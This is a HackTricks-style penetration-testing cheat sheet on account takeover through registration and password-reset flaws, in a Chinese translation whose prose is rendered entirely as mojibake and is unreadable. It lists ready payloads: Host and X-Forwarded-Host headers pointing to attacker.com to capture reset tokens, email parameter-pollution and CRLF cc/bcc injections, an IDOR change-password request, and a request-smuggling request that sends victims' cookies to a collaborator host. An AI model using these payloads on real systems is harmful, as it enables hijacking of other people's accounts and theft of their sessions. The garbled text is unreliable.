# æ³¨å†Œå’Œæ¥ç®¡æ¼æ´

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## æ³¨å†Œæ¥ç®¡

### é‡å¤æ³¨å†Œ

* å°è¯•ä½¿ç”¨å·²å­˜åœ¨çš„ç”¨æˆ·åç”Ÿæˆ
* æ£€æŸ¥å˜åŒ–çš„ç”µå­é‚®ä»¶ï¼š
* å¤§å†™
* \+1@
* åœ¨ç”µå­é‚®ä»¶ä¸­æ·»åŠ ä¸€äº›å†…å®¹
* ç”µå­é‚®ä»¶åç§°ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ%00ï¼Œ%09ï¼Œ%20ï¼‰
* åœ¨ç”µå­é‚®ä»¶åé¢æ”¾ç½®é»‘è‰²å­—ç¬¦ï¼š`test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### ç”¨æˆ·åæšä¸¾

æ£€æŸ¥æ˜¯å¦å¯ä»¥ç¡®å®šåº”ç”¨ç¨‹åºä¸­æ˜¯å¦å·²ç»æ³¨å†Œäº†ç”¨æˆ·åã€‚

### å¯†ç ç­–ç•¥

åˆ›å»ºç”¨æˆ·æ—¶æ£€æŸ¥å¯†ç ç­–ç•¥ï¼ˆæ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨å¼±å¯†ç ï¼‰ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£å‡­æ®ã€‚

### SQLæ³¨å…¥

[**æŸ¥çœ‹æ­¤é¡µé¢**](sql-injection/#insert-statement)ä»¥äº†è§£å¦‚ä½•é€šè¿‡æ³¨å†Œè¡¨å•ä¸­çš„**SQLæ³¨å…¥**å°è¯•æ¥ç®¡è´¦æˆ·æˆ–æå–ä¿¡æ¯ã€‚

### Oauthæ¥ç®¡

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAMLæ¼æ´

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### æ›´æ”¹ç”µå­é‚®ä»¶

æ³¨å†Œåå°è¯•æ›´æ”¹ç”µå­é‚®ä»¶ï¼Œå¹¶æ£€æŸ¥æ­¤æ›´æ”¹æ˜¯å¦è¢«æ­£ç¡®éªŒè¯æˆ–æ˜¯å¦å¯ä»¥å°†å…¶æ›´æ”¹ä¸ºä»»æ„ç”µå­é‚®ä»¶ã€‚

### æ›´å¤šæ£€æŸ¥

* æ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨**ä¸€æ¬¡æ€§ç”µå­é‚®ä»¶**
* **é•¿** **å¯†ç **ï¼ˆ>200ï¼‰å¯¼è‡´**æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰**
* **æ£€æŸ¥è´¦æˆ·åˆ›å»ºçš„é€Ÿç‡é™åˆ¶**
* ä½¿ç”¨username@**burp\_collab**.netå¹¶åˆ†æ**å›è°ƒ**

## **é‡ç½®å¯†ç æ¥ç®¡**

### é€šè¿‡å¼•ç”¨è€…æ³„æ¼é‡ç½®å¯†ç ä»¤ç‰Œ <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. ä½¿ç”¨æ‚¨çš„ç”µå­é‚®ä»¶åœ°å€è¯·æ±‚é‡ç½®å¯†ç 
2. å•å‡»é‡ç½®å¯†ç é“¾æ¥
3. ä¸è¦æ›´æ”¹å¯†ç 
4. å•å‡»ä»»ä½•ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼ˆä¾‹å¦‚ï¼šFacebookï¼ŒTwitterï¼‰
5. æ‹¦æˆªBurp Suiteä»£ç†ä¸­çš„è¯·æ±‚
6. æ£€æŸ¥å¼•ç”¨è€…æ ‡å¤´æ˜¯å¦æ³„æ¼é‡ç½®å¯†ç ä»¤ç‰Œã€‚

### é‡ç½®å¯†ç ç¯¡æ”¹ <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. åœ¨Burp Suiteä¸­æ‹¦æˆªå¯†ç é‡ç½®è¯·æ±‚
2. åœ¨Burp Suiteä¸­æ·»åŠ æˆ–ç¼–è¾‘ä»¥ä¸‹æ ‡å¤´ï¼š`Host: attacker.com`ï¼Œ`X-Forwarded-Host: attacker.com`
3. ä½¿ç”¨ä¿®æ”¹åçš„æ ‡å¤´è½¬å‘è¯·æ±‚\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. æŸ¥æ‰¾åŸºäº_host header_çš„å¯†ç é‡ç½®URLï¼Œä¾‹å¦‚ï¼š`https://attacker.com/reset-password.php?token=TOKEN`

### é€šè¿‡ç”µå­é‚®ä»¶å‚æ•°é‡ç½®å¯†ç  <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### APIå‚æ•°ä¸­çš„IDORæ¼æ´ <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. æ”»å‡»è€…å¿…é¡»ä½¿ç”¨è‡ªå·±çš„è´¦æˆ·ç™»å½•å¹¶è¿›å…¥**æ›´æ”¹å¯†ç **åŠŸèƒ½ã€‚
2. å¯åŠ¨Burp Suiteå¹¶æ‹¦æˆªè¯·æ±‚ã€‚
3. å°†è¯·æ±‚å‘é€åˆ°é‡å¤å™¨é€‰é¡¹å¡å¹¶ç¼–è¾‘å‚æ•°ï¼šç”¨æˆ·ID/ç”µå­é‚®ä»¶\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### å¼±å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

å¯†ç é‡ç½®ä»¤ç‰Œåº”è¯¥æ˜¯æ¯æ¬¡éšæœºç”Ÿæˆä¸”å”¯ä¸€çš„ã€‚\
å°è¯•ç¡®å®šä»¤ç‰Œæ˜¯å¦è¿‡æœŸæˆ–æ˜¯å¦å§‹ç»ˆç›¸åŒï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”Ÿæˆç®—æ³•å¯èƒ½è¾ƒå¼±ä¸”å¯ä»¥è¢«çŒœæµ‹ã€‚ä»¥ä¸‹å˜é‡å¯èƒ½è¢«ç®—æ³•ä½¿ç”¨ã€‚

* æ—¶é—´æˆ³
* ç”¨æˆ·ID
* ç”¨æˆ·ç”µå­é‚®ä»¶
* åå­—å’Œå§“æ°
* å‡ºç”Ÿæ—¥æœŸ
* åŠ å¯†
* ä»…æ•°å­—
* å°ä»¤ç‰Œåºåˆ—ï¼ˆå­—ç¬¦åœ¨\[A-Z,a-z,0-9]ä¹‹é—´ï¼‰
* ä»¤ç‰Œé‡ç”¨
* ä»¤ç‰Œè¿‡æœŸæ—¥æœŸ

### æ³„éœ²å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. ä½¿ç”¨API/UIè§¦å‘ç‰¹å®šç”µå­é‚®ä»¶çš„å¯†ç é‡ç½®è¯·æ±‚ï¼Œä¾‹å¦‚ï¼štest@mail.com
2. æ£€æŸ¥æœåŠ¡å™¨å“åº”å¹¶æŸ¥æ‰¾`resetToken`
3. ç„¶ååœ¨URLä¸­ä½¿ç”¨ä»¤ç‰Œï¼Œå¦‚`https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### é€šè¿‡ç”¨æˆ·åå†²çªè¿›è¡Œå¯†ç é‡ç½® <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. ä½¿ç”¨ä¸å—å®³è€…ç”¨æˆ·åç›¸åŒçš„ç”¨æˆ·ååœ¨ç³»ç»Ÿä¸Šæ³¨å†Œï¼Œä½†åœ¨ç”¨æˆ·åä¹‹å‰å’Œ/æˆ–ä¹‹åæ’å…¥ç©ºæ ¼ï¼Œä¾‹å¦‚ï¼š"admin "
2. ä½¿ç”¨æ¶æ„ç”¨æˆ·åè¯·æ±‚å¯†ç é‡ç½®ã€‚
3. ä½¿ç”¨å‘é€åˆ°æ‚¨çš„ç”µå­é‚®ä»¶çš„ä»¤ç‰Œé‡ç½®å—å®³è€…å¯†ç ã€‚
4. ä½¿ç”¨æ–°å¯†ç è¿æ¥åˆ°å—å®³è€…è´¦æˆ·ã€‚

CTFdå¹³å°æ˜“å—æ­¤æ”»å‡»å½±å“ã€‚\
å‚è§ï¼š[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### é€šè¿‡è·¨ç«™è„šæœ¬æ”»å‡»å®ç°è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. åœ¨åº”ç”¨ç¨‹åºæˆ–å­åŸŸä¸­æ‰¾åˆ°XSSæ¼æ´ï¼ˆå¦‚æœcookieçš„èŒƒå›´é™å®šåœ¨çˆ¶åŸŸåï¼š`*.domain.com`ï¼‰ã€‚
2. æ³„éœ²å½“å‰çš„**ä¼šè¯cookie**ã€‚
3. ä½¿ç”¨cookieè¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚

### é€šè¿‡HTTPè¯·æ±‚èµ°ç§å®ç°è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. ä½¿ç”¨**smuggler**æ£€æµ‹HTTPè¯·æ±‚èµ°ç§çš„ç±»å‹ï¼ˆCLã€TEã€CL.TEï¼‰\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. æ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œå°†`POST / HTTP/1.1`è¦†ç›–ä¸ºä»¥ä¸‹æ•°æ®ï¼š\
`GET http://something.burpcollaborator.net HTTP/1.1 X:`ï¼Œç›®æ ‡æ˜¯å°†å—å®³è€…é‡å®šå‘åˆ°burpcollabå¹¶çªƒå–å…¶cookieã€‚
3. æœ€ç»ˆè¯·æ±‚å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
HackeroneæŠ¥å‘Šåˆ©ç”¨æ­¤æ¼æ´\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### é€šè¿‡CSRFæ¥ç®¡è´¦æˆ· <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. åˆ›å»ºCSRFçš„æœ‰æ•ˆè´Ÿè½½ï¼Œä¾‹å¦‚ï¼šâ€œè‡ªåŠ¨æäº¤å¯†ç æ›´æ”¹çš„HTMLè¡¨å•â€
2. å‘é€æœ‰æ•ˆè´Ÿè½½

### é€šè¿‡JWTæ¥ç®¡è´¦æˆ· <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Tokenå¯èƒ½ç”¨äºç”¨æˆ·èº«ä»½éªŒè¯ã€‚

* ç¼–è¾‘JWTä»¥æ›´æ”¹ç”¨æˆ·ID/ç”µå­é‚®ä»¶
* æ£€æŸ¥å¼±JWTç­¾å

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
